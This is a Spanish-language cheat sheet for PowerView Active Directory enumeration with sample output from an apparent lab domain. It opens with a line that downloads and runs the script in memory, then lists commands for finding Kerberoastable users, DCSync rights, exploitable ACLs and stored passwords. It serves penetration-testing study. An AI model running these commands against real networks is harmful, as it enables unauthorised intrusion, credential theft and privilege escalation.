# PowerView.ps1

{% embed url="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1" %}

Antes de ejecutar cualquiera de los comandos, se debe importar el comando:

{% code overflow="wrap" %}
```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1');
```
{% endcode %}

## Quick enumeration <a href="#quick-enumeration" id="quick-enumeration"></a>

{% code overflow="wrap" %}
```powershell
Get-NetDomain #Basic domain info
#User info
Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount #Basic user enabled info
Get-NetUser -LDAPFilter '(sidHistory=*)' #Find users with sidHistory set
Get-NetUser -PreauthNotRequired #ASREPRoastable users
Get-NetUser -SPN #Kerberoastable users
#Groups info
Get-NetGroup | select samaccountname, admincount, description
Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=EGOTISTICAL-BANK,DC=local' | %{ $_.SecurityIdentifier } | Convert-SidToName #Get AdminSDHolders
#Computers
Get-NetComputer | select samaccountname, operatingsystem
Get-NetComputer -Unconstrained | select samaccountname #DCs always appear but aren't useful for privesc
Get-NetComputer -TrustedToAuth | select samaccountname #Find computers with Constrained Delegation
Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'} #Find any machine accounts in privileged groups
#Shares
Find-DomainShare -CheckShareAccess #Search readable shares
#Domain trusts
Get-NetDomainTrust #Get all domain trusts (parent, children and external)
Get-NetForestDomain | Get-NetDomainTrust #Enumerate all the trusts of all the domains found
#LHF
#Check if any user passwords are set
$FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru} | fl
#Asks DC for all computers, and asks every compute if it has admin access (very noisy). You need RCP and SMB ports opened.
Find-LocalAdminAccess
#Get members from Domain Admins (default) and a list of computers and check if any of the users is logged in any machine running Get-NetSession/Get-NetLoggedon on each host. If -Checkaccess, then it also check for LocalAdmin access in the hosts.
Invoke-UserHunter -CheckAccess
#Find interesting ACLs
Invoke-ACLScanner -ResolveGUIDs | select IdentityReferenceName, ObjectDN, ActiveDirectoryRights | fl
```
{% endcode %}

## Domain info <a href="#domain-info" id="domain-info"></a>

{% code overflow="wrap" %}
```powershell
# Domain Info
Get-NetDomain #Get info about the current domain
Get-NetDomain -Domain mydomain.local
Get-DomainSID #Get domain SID

## Policy
Get-DomainPolicy #Get info about the policy
(Get-DomainPolicy)."KerberosPolicy" #Kerberos tickets info(MaxServiceAge)
(Get-DomainPolicy)."SystemAccess" #Password policy
(Get-DomainPolicy).PrivilegeRights #Check your privileges

## Domain Controller
Get-NetDomainController -Domain mydomain.local #Get Domain Controller
```
{% endcode %}

## Users, Groups and Computers <a href="#users-groups-and-computers" id="users-groups-and-computers"></a>

{% code overflow="wrap" %}
```powershell
# Users
Get-NetUser #Get users with several (not all) properties
Get-NetUser | select -ExpandProperty samaccountname #List all usernames
Get-NetUser -UserName student107 #Get info about a user
Get-NetUser -properties name, description #Get all descriptions
Get-NetUser -properties name, pwdlastset, logoncount, badpwdcount  #Get all pwdlastset, logoncount and badpwdcount
Find-UserField -SearchField Description -SearchTerm "built" #Search account with "something" in a parameter

## Users Filters
Get-NetUser -UACFilter NOT_ACCOUNTDISABLE -properties distinguishedname #All enabled users
Get-NetUser -UACFilter ACCOUNTDISABLE #All disabled users
Get-NetUser -UACFilter SMARTCARD_REQUIRED #Users that require a smart card
Get-NetUser -UACFilter NOT_SMARTCARD_REQUIRED -Properties samaccountname #Not smart card users
Get-NetUser -LDAPFilter '(sidHistory=*)' #Find users with sidHistory set
Get-NetUser -PreauthNotRequired #ASREPRoastable users
Get-NetUser -SPN | select serviceprincipalname #Kerberoastable users
Get-NetUser -SPN | ?{$_.memberof -match 'Domain Admins'} #Domain admins kerberostable
Get-Netuser -TrustedToAuth #Useful for Kerberos constrain delegation
Get-NetUser -AllowDelegation -AdminCount #All privileged users that aren't marked as sensitive/not for delegation
# retrieve *most* users who can perform DC replication for dev.testlab.local (i.e. DCsync)
Get-ObjectAcl "dc=dev,dc=testlab,dc=local" -ResolveGUIDs | ? {
    ($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')
}

#Groups
Get-NetGroup #Get groups
Get-NetGroup -Domain mydomain.local #Get groups of an specific domain
Get-NetGroup 'Domain Admins' #Get all data of a group
Get-NetGroup -AdminCount #Search admin grups
Get-NetGroup -UserName "myusername" #Get groups of a user
Get-NetGroupMember -Identity "Administrators" -Recurse #Get users inside "Administrators" group. If there are groups inside of this grup, the -Recurse option will print the users inside the others groups also
Get-NetGroupMember -Identity "Enterprise Admins" -Domain mydomain.local #Remember that "Enterprise Admins" group only exists in the rootdomain of the forest
Get-NetLocalGroup -ComputerName dc.mydomain.local -ListGroups #Get Local groups of a machine (you need admin rights in no DC hosts)
Get-NetLocalGroupMember -computername dcorp-dc.dollarcorp.moneycorp.local #Get users of localgroups in computer
Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs #Check AdminSDHolder users
Get-NetGPOGroup #Get restricted groups

# Computers
Get-NetComputer #Get all computer objects
Get-NetComputer -Ping #Send a ping to check if the computers are working
Get-NetComputer -Unconstrained #DCs always appear but aren't useful for privesc
Get-NetComputer -TrustedToAuth #Find computers with Constrined Delegation
Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'} #Find any machine accounts in privileged groups
```
{% endcode %}

Logon and Sessions

{% code overflow="wrap" %}
```powershell
Get-NetLoggedon -ComputerName <servername> #Get net logon users at the moment in a computer (need admins rights on target)
Get-NetSession -ComputerName <servername> #Get active sessions on the host
Get-LoggedOnLocal -ComputerName <servername> #Get locally logon users at the moment (need remote registry (default in server OS))
Get-LastLoggedon -ComputerName <servername> #Get last user logged on (needs admin rigths in host)
Get-NetRDPSession -ComputerName <servername> #List RDP sessions inside a host (needs admin rights in host)
```
{% endcode %}

## Shared files and folders <a href="#shared-files-and-folders" id="shared-files-and-folders"></a>

{% code overflow="wrap" %}
```powershell
Get-NetFileServer #Search file servers. Lot of users use to be logged in this kind of servers
Find-DomainShare -CheckShareAccess #Search readable shares
Find-InterestingDomainShareFile #Find interesting files, can use filters
```
{% endcode %}

## GPOs & OUs <a href="#gpos-and-ous" id="gpos-and-ous"></a>

{% code overflow="wrap" %}
```powershell
#GPO
Get-NetGPO #Get all policies with details
Get-NetGPO | select displayname #Get the names of the policies
Get-NetGPO -ComputerName <servername> #Get the policy applied in a computer
gpresult /V #Get current policy
# Enumerate permissions for GPOs where users with RIDs of > -1000 have some kind of modification/control rights
Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')}
Get-NetGPO -GPOName '{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}' #Get GPO of an OU

#OU
Get-NetOU #Get Organization Units
Get-NetOU StudentMachines | %{Get-NetComputer -ADSPath $_} #Get all computers inside an OU (StudentMachines in this case)
```
{% endcode %}

## ACL <a href="#acl" id="acl"></a>

{% code overflow="wrap" %}
```powershell
Get-ObjectAcl -SamAccountName <username> -ResolveGUIDs #Get ACLs of an object (permissions of other objects over the indicated one)
Get-PathAcl -Path "\\dc.mydomain.local\sysvol" #Get permissions of a file
Find-InterestingDomainAcl -ResolveGUIDs #Find intresting ACEs (Interesting permisions of "unexpected objects" (RID>1000 and modify permissions) over other objects
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReference -match "RDPUsers"} #Check if any of the interesting permissions founds is realated to a username/group
Get-NetGroupMember -GroupName "Administrators" -Recurse | ?{$_.IsGroup -match "false"} | %{Get-ObjectACL -SamAccountName $_.MemberName -ResolveGUIDs} | select ObjectDN, IdentityReference, ActiveDirectoryRights #Get special rights over All administrators in domain
```
{% endcode %}

## Domain Trust <a href="#domain-trust" id="domain-trust"></a>

{% code overflow="wrap" %}
```powershell
Get-NetDomainTrust #Get all domain trusts (parent, children and external)
Get-NetForestDomain | Get-NetDomainTrust #Enumerate all the trusts of all the domains found
Get-DomainTrustMapping #Enumerate also all the trusts

Get-ForestGlobalCatalog #Get info of current forest (no external)
Get-ForestGlobalCatalog -Forest external.domain #Get info about the external forest (if possible)
Get-DomainTrust -SearchBase "GC://$($ENV:USERDNSDOMAIN)" 

Get-NetForestTrust #Get forest trusts (it must be between 2 roots, trust between a child and a root is just an external trust)

Get-DomainForeingUser #Get users with privileges in other domains inside the forest
Get-DomainForeignGroupMember #Get groups with privileges in other domains inside the forest
```
{% endcode %}

## Quick Win

### Enumeración de Usuarios&#x20;

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">PS C:\> Get-NetUser -properties name, description

name               description                                             
----               -----------                                             
Administrator      Built-in account for administering the computer/domain  
Guest              Built-in account for guest access to the computer/domain
admin                                                                      
krbtgt             Key Distribution Center Service Account                 
regular.user                                                               
dnsadmin.user                                                              
unconstrained.user                                                         
constrained.user                                                           
userwrite.user                                                             
userall.user                                                               
compwrite.user                                                             
gpowrite.user                                                              
lapsread.user      LAPS yet to be implemented                              
groupwrite.user                                                            
writedacldc.user                                                           
readgmsa.user      GMSA yet to be implemented                              
clearpass.user     Remember to remove this! <a data-footnote-ref href="#user-content-fn-1">Password@1</a>                     
roast.user                                                                 
asrep.user                                                                 
AdminWebServer
</code></pre>

### **Enumeración de Grupos** <a href="#vulnerabilidades-posibles" id="vulnerabilidades-posibles"></a>

#### **Vulnerabilidades posibles**: <a href="#vulnerabilidades-posibles" id="vulnerabilidades-posibles"></a>

* Grupos con privilegios que contienen demasiados miembros.
* Grupos que no deberían existir (por ejemplo, restos de pruebas o configuraciones antiguas).
* Grupos anidados que pueden ser explotados para elevar privilegios de forma indirecta.

{% code overflow="wrap" %}
```
PS C:\v> Get-NetGroup | select samaccountname, admincount, description

samaccountname                          admincount description                                                         
--------------                          ---------- -----------                                                         
Administrators                                   1 Administrators have complete and unrestricted access to the compu...
Users                                              Users are prevented from making accidental or intentional system-...
Guests                                             Guests have the same access as members of the Users group by defa...
Print Operators                                  1 Members can administer printers installed on domain controllers     
Backup Operators                                 1 Backup Operators can override security restrictions for the sole ...
Replicator                                       1 Supports file replication in a domain                               
Remote Desktop Users                               Members in this group are granted the right to logon remotely       
Network Configuration Operators                    Members in this group can have some administrative privileges to ...
Performance Monitor Users                          Members of this group can access performance counter data locally...
Performance Log Users                              Members of this group may schedule logging of performance counter...
Distributed COM Users                              Members are allowed to launch, activate and use Distributed COM o...
IIS_IUSRS                                          Built-in group used by Internet Information Services.               
Cryptographic Operators                            Members are authorized to perform cryptographic operations.         
Event Log Readers                                  Members of this group can read event logs from local machine        
Certificate Service DCOM Access                    Members of this group are allowed to connect to Certification Aut...
RDS Remote Access Servers                          Servers in this group enable users of RemoteApp programs and pers...
RDS Endpoint Servers                               Servers in this group run virtual machines and host sessions wher...
RDS Management Servers                             Servers in this group can perform routine administrative actions ...
Hyper-V Administrators                             Members of this group have complete and unrestricted access to al...
Access Control Assistance Operators                Members of this group can remotely query authorization attributes...
Remote Management Users                            Members of this group can access WMI resources over management pr...
Storage Replica Administrators                     Members of this group have complete and unrestricted access to al...
Domain Computers                                   All workstations and servers joined to the domain                   
Domain Controllers                               1 All domain controllers in the domain                                
Schema Admins                                    1 Designated administrators of the schema                             
Enterprise Admins                                1 Designated administrators of the enterprise                         
Cert Publishers                                    Members of this group are permitted to publish certificates to th...
Domain Admins                                    1 Designated administrators of the domain                             
Domain Users                                       All domain users                                                    
Domain Guests                                      All domain guests                                                   
Group Policy Creator Owners                        Members in this group can modify group policy for the domain        
RAS and IAS Servers                                Servers in this group can access remote access properties of users  
Server Operators                                 1 Members can administer domain servers                               
Account Operators                                1 Members can administer domain user and group accounts               
Pre-Windows 2000 Compatible Access                 A backward compatibility group which allows read access on all us...
Incoming Forest Trust Builders                     Members of this group can create incoming, one-way trusts to this...
Windows Authorization Access Group                 Members of this group have access to the computed tokenGroupsGlob...
Terminal Server License Servers                    Members of this group can update user accounts in Active Director...
Allowed RODC Password Replication Group            Members in this group can have their passwords replicated to all ...
Denied RODC Password Replication Group             Members in this group cannot have their passwords replicated to a...
Read-only Domain Controllers                     1 Members of this group are Read-Only Domain Controllers in the domain
Enterprise Read-only Domain Controllers            Members of this group are Read-Only Domain Controllers in the ent...
Cloneable Domain Controllers                       Members of this group that are domain controllers may be cloned.    
Protected Users                                    Members of this group are afforded additional protections against...
Key Admins                                       1 Members of this group can perform administrative actions on key o...
Enterprise Key Admins                            1 Members of this group can perform administrative actions on key o...
DnsAdmins                                          DNS Administrators Group                                            
DnsUpdateProxy                                     DNS clients who are permitted to perform dynamic updates on behal...
```
{% endcode %}

#### Grupos relevantes en AD: <a href="#grupos-relevantes-en-a-d" id="grupos-relevantes-en-a-d"></a>

1. **Administradores del Dominio** (_Domain Admins_): Miembros de este grupo tienen permisos completos y de control total en el dominio. Es el grupo más poderoso y es el objetivo principal para muchos atacantes.
2. **Administradores de la Empresa** (_Enterprise Admins_): Estos administradores tienen permisos en todos los dominios de un bosque. Si una organización tiene múltiples dominios, este grupo es aún más poderoso que "Domain Admins".
3. **Administradores de Esquema** (_Schema Admins_): Los miembros de este grupo pueden modificar el esquema del AD, que es la estructura subyacente que define objetos y atributos.
4. **Usuarios del Dominio** (_Domain Users_): Este grupo incluye todas las cuentas de usuario en un dominio. A menudo se verifica para identificar posibles cuentas huérfanas o no utilizadas.
5. **Computadoras del Dominio** (_Domain Computers_): Este grupo incluye todas las estaciones de trabajo y servidores unidos al dominio.
6. **Controladores de Dominio** (_Domain Controllers_): Este grupo incluye todos los controladores de dominio en un dominio. Es esencial garantizar que sólo las máquinas confiables sean parte de este grupo.
7. **Política de replicación de lectura** (_Read-Only Domain Controllers - RODC_): Si la organización utiliza RODCs, es esencial garantizar que estén configurados correctamente.

### Enumeración de Computadoras

#### **Vulnerabilidades posibles**: <a href="#vulnerabilidades-posibles" id="vulnerabilidades-posibles"></a>

* Sistemas sin parches o desactualizados.
* Computadoras con servicios vulnerables expuestos.
* Identificación de sistemas críticos, como servidores de bases de datos o controladores de dominio.

```
PS C:\> Get-NetComputer | select samaccountname, operatingsystem

samaccountname operatingsystem               
-------------- ---------------               
FIRST-DC$      Windows Server 2019 Datacenter
Suspicious-PC$                               
USER-SERVER$   Windows Server 2019 Datacenter
WEBSERVER$     Windows Server 2022 Datacenter
```

### Enumeración de GPO

#### **Vulnerabilidades posibles**: <a href="#vulnerabilidades-posibles" id="vulnerabilidades-posibles"></a>

* Políticas mal configuradas que podrían permitir a un atacante moverse libremente o elevar privilegios.
* GPOs que establecen configuraciones inseguras o permisos laxos.
* Información sobre scripts de inicio o cierre de sesión que podrían ser explotados.

```
PS C:\windows\system32\inetsrv> Get-NetGPO | select displayname

displayname                      
-----------                      
Default Domain Policy            
Default Domain Controllers Policy
```

#### GPOs relevantes en AD: <a href="#gpos-relevantes-en-a-d" id="gpos-relevantes-en-a-d"></a>

1. **Default Domain Policy**: Esta es la GPO que se aplica a todo el dominio. A menudo se revisa para configuraciones de seguridad, como políticas de contraseñas y restricciones de cuenta.
2. **Default Domain Controllers Policy**: Se aplica específicamente a los controladores de dominio. Es crucial revisarla para configuraciones que afecten la seguridad de los controladores de dominio, como configuraciones de auditoría y derechos de usuario.
3. **Account Lockout Policy**: Esta política define cuántos intentos de inicio de sesión fallidos causarán que una cuenta sea bloqueada y durante cuánto tiempo. Es fundamental para proteger contra intentos de fuerza bruta.
4. **Password Policy**: Define los requisitos para contraseñas de usuario, como longitud mínima, complejidad y duración máxima.

### Enumeración de ACL

#### **Vulnerabilidades posibles**: <a href="#vulnerabilidades-posibles" id="vulnerabilidades-posibles"></a>

* ACLs mal configuradas que otorgan acceso excesivo a recursos críticos.
* Permisos heredados que no deberían aplicarse a ciertos recursos.
* Posibilidades de escalada de privilegios debido a permisos inapropiados.

```
PS C:\windows\system32\inetsrv> Find-InterestingDomainAcl -ResolveGUIDs
ObjectDN                : CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC=spartancybersec,DC=corp
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : CreateChild, DeleteChild, ReadProperty, WriteProperty, GenericExecute
ObjectAceType           : None
AceFlags                : ContainerInherit
AceType                 : AccessAllowed
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-1861162130-2580302541-221646211-1121
IdentityReferenceName   : gpowrite.user
IdentityReferenceDomain : spartancybersec.corp
IdentityReferenceDN     : CN=gpowrite.user,CN=Users,DC=spartancybersec,DC=corp
IdentityReferenceClass  : user

ObjectDN                : CN=User,CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC=spartancybersec,DC
                          =corp
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : CreateChild, DeleteChild, ReadProperty, WriteProperty, GenericExecute
ObjectAceType           : None
AceFlags                : ContainerInherit, Inherited
AceType                 : AccessAllowed
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-1861162130-2580302541-221646211-1121
IdentityReferenceName   : gpowrite.user
IdentityReferenceDomain : spartancybersec.corp
IdentityReferenceDN     : CN=gpowrite.user,CN=Users,DC=spartancybersec,DC=corp
IdentityReferenceClass  : user

ObjectDN                : CN=Machine,CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC=spartancybersec
                          ,DC=corp
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : CreateChild, DeleteChild, ReadProperty, WriteProperty, GenericExecute
ObjectAceType           : None
AceFlags                : ContainerInherit, Inherited
AceType                 : AccessAllowed
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-1861162130-2580302541-221646211-1121
IdentityReferenceName   : gpowrite.user
IdentityReferenceDomain : spartancybersec.corp
IdentityReferenceDN     : CN=gpowrite.user,CN=Users,DC=spartancybersec,DC=corp
IdentityReferenceClass  : user

ObjectDN                : CN=FIRST-DC,OU=Domain Controllers,DC=spartancybersec,DC=corp
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : WriteDacl
ObjectAceType           : None
AceFlags                : ContainerInherit
AceType                 : AccessAllowed
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-1861162130-2580302541-221646211-1124
IdentityReferenceName   : writedacldc.user
IdentityReferenceDomain : spartancybersec.corp
IdentityReferenceDN     : CN=writedacldc.user,CN=Users,DC=spartancybersec,DC=corp
IdentityReferenceClass  : user

ObjectDN                : CN=FIRST-DC,OU=Domain Controllers,DC=spartancybersec,DC=corp
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericWrite
ObjectAceType           : None
AceFlags                : ContainerInherit
AceType                 : AccessAllowed
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-1861162130-2580302541-221646211-1120
IdentityReferenceName   : compwrite.user
IdentityReferenceDomain : spartancybersec.corp
IdentityReferenceDN     : CN=compwrite.user,CN=Users,DC=spartancybersec,DC=corp
IdentityReferenceClass  : user

ObjectDN                : CN=RID Set,CN=FIRST-DC,OU=Domain Controllers,DC=spartancybersec,DC=corp
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : WriteDacl
ObjectAceType           : None
AceFlags                : ContainerInherit, Inherited
AceType                 : AccessAllowed
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-1861162130-2580302541-221646211-1124
IdentityReferenceName   : writedacldc.user
IdentityReferenceDomain : spartancybersec.corp
IdentityReferenceDN     : CN=writedacldc.user,CN=Users,DC=spartancybersec,DC=corp
IdentityReferenceClass  : user

ObjectDN                : CN=RID Set,CN=FIRST-DC,OU=Domain Controllers,DC=spartancybersec,DC=corp
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericWrite
ObjectAceType           : None
AceFlags                : ContainerInherit, Inherited
AceType                 : AccessAllowed
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-1861162130-2580302541-221646211-1120
IdentityReferenceName   : compwrite.user
IdentityReferenceDomain : spartancybersec.corp
IdentityReferenceDN     : CN=compwrite.user,CN=Users,DC=spartancybersec,DC=corp
IdentityReferenceClass  : user

ObjectDN                : DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=spartancybersec,DC=corp
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete, 
                          GenericWrite, WriteDacl, WriteOwner
ObjectAceType           : None
AceFlags                : ContainerInherit, Inherited
AceType                 : AccessAllowed
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-1861162130-2580302541-221646211-1110
IdentityReferenceName   : DnsAdmins
IdentityReferenceDomain : spartancybersec.corp
IdentityReferenceDN     : CN=DnsAdmins,CN=Users,DC=spartancybersec,DC=corp
IdentityReferenceClass  : group

ObjectDN                : DC=@,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=spartancybersec,DC=corp
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete, 
                          GenericWrite, WriteDacl, WriteOwner
ObjectAceType           : None
AceFlags                : ContainerInherit, Inherited
AceType                 : AccessAllowed
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-1861162130-2580302541-221646211-1110
IdentityReferenceName   : DnsAdmins
IdentityReferenceDomain : spartancybersec.corp
IdentityReferenceDN     : CN=DnsAdmins,CN=Users,DC=spartancybersec,DC=corp
IdentityReferenceClass  : group

ObjectDN                : DC=a.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=spartancybersec,DC=corp
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete, 
                          GenericWrite, WriteDacl, WriteOwner
ObjectAceType           : None
AceFlags                : ContainerInherit, Inherited
AceType                 : AccessAllowed
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-1861162130-2580302541-221646211-1110
IdentityReferenceName   : DnsAdmins
IdentityReferenceDomain : spartancybersec.corp
IdentityReferenceDN     : CN=DnsAdmins,CN=Users,DC=spartancybersec,DC=corp
IdentityReferenceClass  : group

ObjectDN                : DC=b.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=spartancybersec,DC=corp
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete, 
                          GenericWrite, WriteDacl, WriteOwner
ObjectAceType           : None
AceFlags                : ContainerInherit, Inherited
AceType                 : AccessAllowed
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-1861162130-2580302541-221646211-1110
IdentityReferenceName   : DnsAdmins
IdentityReferenceDomain : spartancybersec.corp
IdentityReferenceDN     : CN=DnsAdmins,CN=Users,DC=spartancybersec,DC=corp
IdentityReferenceClass  : group

ObjectDN                : DC=c.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=spartancybersec,DC=corp
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete, 
                          GenericWrite, WriteDacl, WriteOwner
ObjectAceType           : None
AceFlags                : ContainerInherit, Inherited
AceType                 : AccessAllowed
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-1861162130-2580302541-221646211-1110
IdentityReferenceName   : DnsAdmins
IdentityReferenceDomain : spartancybersec.corp
IdentityReferenceDN     : CN=DnsAdmins,CN=Users,DC=spartancybersec,DC=corp
IdentityReferenceClass  : group

ObjectDN                : DC=d.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=spartancybersec,DC=corp
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete, 
                          GenericWrite, WriteDacl, WriteOwner
ObjectAceType           : None
AceFlags                : ContainerInherit, Inherited
AceType                 : AccessAllowed
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-1861162130-2580302541-221646211-1110
IdentityReferenceName   : DnsAdmins
IdentityReferenceDomain : spartancybersec.corp
IdentityReferenceDN     : CN=DnsAdmins,CN=Users,DC=spartancybersec,DC=corp
IdentityReferenceClass  : group

ObjectDN                : DC=e.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=spartancybersec,DC=corp
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete, 
                          GenericWrite, WriteDacl, WriteOwner
ObjectAceType           : None
AceFlags                : ContainerInherit, Inherited
AceType                 : AccessAllowed
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-1861162130-2580302541-221646211-1110
IdentityReferenceName   : DnsAdmins
IdentityReferenceDomain : spartancybersec.corp
IdentityReferenceDN     : CN=DnsAdmins,CN=Users,DC=spartancybersec,DC=corp
IdentityReferenceClass  : group

ObjectDN                : DC=f.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=spartancybersec,DC=corp
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete, 
                          GenericWrite, WriteDacl, WriteOwner
ObjectAceType           : None
AceFlags                : ContainerInherit, Inherited
AceType                 : AccessAllowed
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-1861162130-2580302541-221646211-1110
IdentityReferenceName   : DnsAdmins
IdentityReferenceDomain : spartancybersec.corp
IdentityReferenceDN     : CN=DnsAdmins,CN=Users,DC=spartancybersec,DC=corp
IdentityReferenceClass  : group

ObjectDN                : DC=g.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=spartancybersec,DC=corp
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete, 
                          GenericWrite, WriteDacl, WriteOwner
ObjectAceType           : None
AceFlags                : ContainerInherit, Inherited
AceType                 : AccessAllowed
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-1861162130-2580302541-221646211-1110
IdentityReferenceName   : DnsAdmins
IdentityReferenceDomain : spartancybersec.corp
IdentityReferenceDN     : CN=DnsAdmins,CN=Users,DC=spartancybersec,DC=corp
IdentityReferenceClass  : group

ObjectDN                : DC=h.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=spartancybersec,DC=corp
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete, 
                          GenericWrite, WriteDacl, WriteOwner
ObjectAceType           : None
AceFlags                : ContainerInherit, Inherited
AceType                 : AccessAllowed
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-1861162130-2580302541-221646211-1110
IdentityReferenceName   : DnsAdmins
IdentityReferenceDomain : spartancybersec.corp
IdentityReferenceDN     : CN=DnsAdmins,CN=Users,DC=spartancybersec,DC=corp
IdentityReferenceClass  : group

ObjectDN                : DC=i.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=spartancybersec,DC=corp
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete, 
                          GenericWrite, WriteDacl, WriteOwner
ObjectAceType           : None
AceFlags                : ContainerInherit, Inherited
AceType                 : AccessAllowed
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-1861162130-2580302541-221646211-1110
IdentityReferenceName   : DnsAdmins
IdentityReferenceDomain : spartancybersec.corp
IdentityReferenceDN     : CN=DnsAdmins,CN=Users,DC=spartancybersec,DC=corp
IdentityReferenceClass  : group

ObjectDN                : DC=j.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=spartancybersec,DC=corp
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete, 
                          GenericWrite, WriteDacl, WriteOwner
ObjectAceType           : None
AceFlags                : ContainerInherit, Inherited
AceType                 : AccessAllowed
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-1861162130-2580302541-221646211-1110
IdentityReferenceName   : DnsAdmins
IdentityReferenceDomain : spartancybersec.corp
IdentityReferenceDN     : CN=DnsAdmins,CN=Users,DC=spartancybersec,DC=corp
IdentityReferenceClass  : group

ObjectDN                : DC=k.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=spartancybersec,DC=corp
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete, 
                          GenericWrite, WriteDacl, WriteOwner
ObjectAceType           : None
AceFlags                : ContainerInherit, Inherited
AceType                 : AccessAllowed
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-1861162130-2580302541-221646211-1110
